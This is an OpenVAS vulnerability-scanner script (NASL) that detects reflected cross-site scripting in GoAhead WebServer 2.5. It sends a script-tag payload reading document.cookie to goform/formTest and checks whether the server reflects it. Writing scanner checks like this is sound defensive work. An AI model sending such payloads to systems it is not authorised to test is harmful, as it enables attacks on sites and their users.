###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_goahead_webserver_mult_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# GoAhead WebServer 'name' and 'address' Cross-Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902589");
  script_version("$Revision: 11997 $");
  script_bugtraq_id(50729);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-23 12:12:12 +0530 (Wed, 23 Nov 2011)");
  script_name("GoAhead WebServer 'name' and 'address' Cross-Site Scripting Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("GoAhead-Webs/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");
  script_tag(name:"affected", value:"GoAhead Webserver version 2.5");
  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied
  input via the 'name' and 'address' parameters in goform/formTest, which allows
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running GoAhead Webserver and is prone to multiple
  cross site scripting vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46896");
  script_xref(name:"URL", value:"http://webserver.goahead.com/forum/topic/169");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("Server: GoAhead-Webs" >!< banner) {
  exit(0);
}

url = "/goform/formTest?name=<script>alert(document.cookie)</script>";

if(http_vuln_check(port:port, url:url, check_header: TRUE,
                   pattern:"Name: <script>alert\(document.cookie\)</script>")){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
